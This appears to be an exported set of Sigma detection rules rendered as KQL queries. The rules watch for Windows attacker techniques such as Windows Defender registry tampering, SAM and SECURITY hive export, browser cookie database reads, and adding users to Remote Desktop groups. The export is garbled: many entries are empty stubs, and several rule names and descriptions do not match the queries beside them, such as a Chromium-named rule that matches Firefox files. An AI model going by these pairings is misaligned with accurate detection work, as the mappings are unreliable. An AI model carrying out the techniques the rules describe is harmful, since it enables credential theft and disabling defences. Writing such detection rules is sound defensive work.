sigma_rule.description: Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.
sigma_rule.name: Detected Windows Software Discovery

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine contains '\\AppDataLow\\Software\\Microsoft\\' or _CommandLine contains '\\Policies\\Microsoft\\Windows\\OOBE' or _CommandLine contains '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' or _CommandLine contains '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon' or _CommandLine contains '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' or _CommandLine contains '\\Microsoft\\Windows Defender\\')

sigma_rule.description: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys
sigma_rule.name: Reg Add Suspicious Paths

pysigma_kql:
events_all
| where data_source_type_id == 12 and _CommandLine has_all ('reg', ' add ', '\\Services\\VSS\\Diag', '/d Disabled')

sigma_rule.description: Detects commands that temporarily turn off Volume Snapshots
sigma_rule.name: Disabled Volume Snapshots

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine contains 'SOFTWARE\\Microsoft\\Windows Defender\\' or _CommandLine contains 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center' or _CommandLine contains 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\')) and (((_CommandLine has_all (' add ', 'd 0')) and (_CommandLine contains 'DisallowExploitProtectionOverride' or _CommandLine contains 'EnableControlledFolderAccess' or _CommandLine contains 'MpEnablePus' or _CommandLine contains 'PUAProtection' or _CommandLine contains 'SpynetReporting' or _CommandLine contains 'SubmitSamplesConsent' or _CommandLine contains 'TamperProtection')) or ((_CommandLine has_all (' add ', 'd 1')) and (_CommandLine contains 'DisableAntiSpyware' or _CommandLine contains 'DisableAntiSpywareRealtimeProtection' or _CommandLine contains 'DisableAntiVirus' or _CommandLine contains 'DisableArchiveScanning' or _CommandLine contains 'DisableBehaviorMonitoring' or _CommandLine contains 'DisableBlockAtFirstSeen' or _CommandLine contains 'DisableConfig' or _CommandLine contains 'DisableEnhancedNotifications' or _CommandLine contains 'DisableIntrusionPreventionSystem' or _CommandLine contains 'DisableIOAVProtection' or _CommandLine contains 'DisableOnAccessProtection' or _CommandLine contains 'DisablePrivacyMode' or _CommandLine contains 'DisableRealtimeMonitoring' or _CommandLine contains 'DisableRoutinelyTakingAction' or _CommandLine contains 'DisableScanOnRealtimeEnable' or _CommandLine contains 'DisableScriptScanning' or _CommandLine contains 'Notification_Suppress' or _CommandLine contains 'SignatureDisableUpdateOnStartupWithoutEngine')))

sigma_rule.description: Detects the usage of "reg.exe" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection

detection.condition: all of selection_root_* and 1 of selection_dword_*

sigma_rule.name: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (_CommandLine has_all ('reg add', '\\system\\currentcontrolset\\control', 'write protection', '0')) and (_CommandLine contains 'storage' or _CommandLine contains 'storagedevicepolicies')

sigma_rule.description: Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.
sigma_rule.name: Write Protect For Storage Disabled

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((((file_name endswith 'Regsvcs.exe' or file_name endswith 'Regasm.exe') or (file_name in~ ('RegSvcs.exe', 'RegAsm.exe'))) and (_CommandLine contains '\\Users\\Public\\' or _CommandLine contains '\\AppData\\Local\\Temp\\' or _CommandLine contains '\\Desktop\\' or _CommandLine contains '\\Downloads\\' or _CommandLine contains '\\PerfLogs\\' or _CommandLine contains '\\Windows\\Temp\\' or _CommandLine contains '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')) or (((file_name endswith 'Regsvcs.exe' or file_name endswith 'Regasm.exe') or (file_name in~ ('RegSvcs.exe', 'RegAsm.exe'))) and (not((_CommandLine contains '.dll' or (_CommandLine endswith '\\Regasm.exe"' or _CommandLine endswith '\\Regasm.exe' or _CommandLine endswith '\\Regsvcs.exe"' or _CommandLine endswith '\\Regsvcs.exe'))))))

sigma_rule.description: Detects suspicious execution of Regasm/Regsvcs utilities

detection.condition: all of selection_* or (selection_img and not 1 of filter_main_*)

sigma_rule.name: Regasm/Regsvcs Suspicious Execution

pysigma_kql:
events_all
| project _fileParentName, _CommandLine
| where data_source_type_id == 12 and (file_name endswith 'regedit.exe' or file_name =~ 'REGEDIT.EXE') and (_CommandLine contains ' /E ' or _CommandLine contains ' -E ') and (_CommandLine contains 'hklm' or _CommandLine contains 'hkey_local_machine') and (_CommandLine endswith '\\system' or _CommandLine endswith '\\sam' or _CommandLine endswith '\\security')

sigma_rule.description: Detects the export of a crital Registry key to a file.
sigma_rule.name: Exports Critical Registry Keys To a File

pysigma_kql:
events_all
| project _fileParentName, _CommandLine
| where data_source_type_id == 12 and ((file_name endswith 'regedit.exe' or file_name =~ 'REGEDIT.EXE') and (_CommandLine contains ' /E ' or _CommandLine contains ' -E ')) and (not(((_CommandLine contains 'hklm' or _CommandLine contains 'hkey_local_machine') and (_CommandLine endswith '\\system' or _CommandLine endswith '\\sam' or _CommandLine endswith '\\security'))))

sigma_rule.description: Detects the export of the target Registry key to a file.

detection.condition: all of selection_* and not all of filter_*

sigma_rule.name: Exports Registry Key To a File

pysigma_kql:
events_all
| project _fileParentName, _CommandLine
| where data_source_type_id == 12 and ((file_name endswith 'regedit.exe' or file_name =~ 'REGEDIT.EXE') and (_CommandLine contains ' /i ' or _CommandLine contains ' /s ' or _CommandLine contains '.reg')) and (not(((_CommandLine contains ' /e ' or _CommandLine contains ' /a ' or _CommandLine contains ' /c ' or _CommandLine contains ' -e ' or _CommandLine contains ' -a ' or _CommandLine contains ' -c ') and _CommandLine matches regex ':[^ \\]')))

sigma_rule.description: Detects the import of the specified file to the registry with regedit.exe.

detection.condition: all of selection_* and not all of filter_*

sigma_rule.name: Imports Registry Key From a File

pysigma_kql:

| where data_source_type_id == 12 and file_parent_name endswith 'Serv-U.exe' and (file_name endswith 'cmd.exe' or file_name endswith 'powershell.exe' or file_name endswith 'pwsh.exe' or file_name endswith 'wscript.exe' or file_name endswith 'cscript.exe' or file_name endswith 'sh.exe' or file_name endswith 'bash.exe' or file_name endswith 'schtasks.exe' or file_name endswith 'regsvr32.exe' or file_name endswith 'wmic.exe' or file_name endswith 'mshta.exe' or file_name endswith 'rundll32.exe' or file_name endswith 'msiexec.exe' or file_name endswith 'forfiles.exe' or file_name endswith 'scriptrunner.exe')

sigma_rule.description: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'setspn.exe' or file_name =~ 'setspn.exe' or (_Description has_all ('Query or reset the computer', 'SPN attribute'))) and _CommandLine contains '-q'

pysigma_kql:
events_all

pysigma_kql:
events_all

pysigma_kql:
events_all

pysigma_kql:
events_all

pysigma_kql:
events_all

pysigma_kql:
events_all

sigma_rule.description: Detect usage of the "sqlite" binary to query databases in Chromium-based browsers for potential data stealing.
sigma_rule.name: SQLite Chromium Profile Data DB Access

pysigma_kql:
events_all
| where data_source_type_id == 12 and (_Product =~ 'SQLite' or (file_name endswith 'sqlite.exe' or file_name endswith 'sqlite3.exe')) and (_CommandLine contains 'cookies.sqlite' or _CommandLine contains 'places.sqlite')

sigma_rule.description: Detect usage of the "sqlite" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.

pysigma_kql:

pysigma_kql:
events_all

sigma_rule.description: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research reoport.
sigma_rule.name: Potential Amazon SSM Agent Hijacking

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_parent_name endswith 'stordiag.exe' and (file_name endswith 'schtasks.exe' or file_name endswith 'systeminfo.exe' or file_name endswith 'fltmc.exe')) and (not((dir_path startswith 'c:\\windows\\system32\\' or dir_path startswith 'c:\\windows\\syswow64\\')))

pysigma_kql:
events_all

pysigma_kql:
events_all

pysigma_kql:
events_all

sigma_rule.name: Add User to Local Administrators Group

pysigma_kql:
events_all
| project _CommandLine, _ParentCommandLine
| where data_source_type_id == 12 and ((_CommandLine has_all ('localgroup ', ' /add')) or (_CommandLine has_all ('Add-LocalGroupMember ', ' -Group '))) and (_CommandLine contains 'Remote Desktop Users' or _CommandLine contains 'Utilisateurs du Bureau à distance' or _CommandLine contains 'Usuarios de escritorio remoto')

sigma_rule.description: Detects suspicious command line in which a user gets added to the local Remote Desktop Users group
sigma_rule.name: Suspicious Add User to Remote Desktop Users Group

pysigma_kql:
events_all
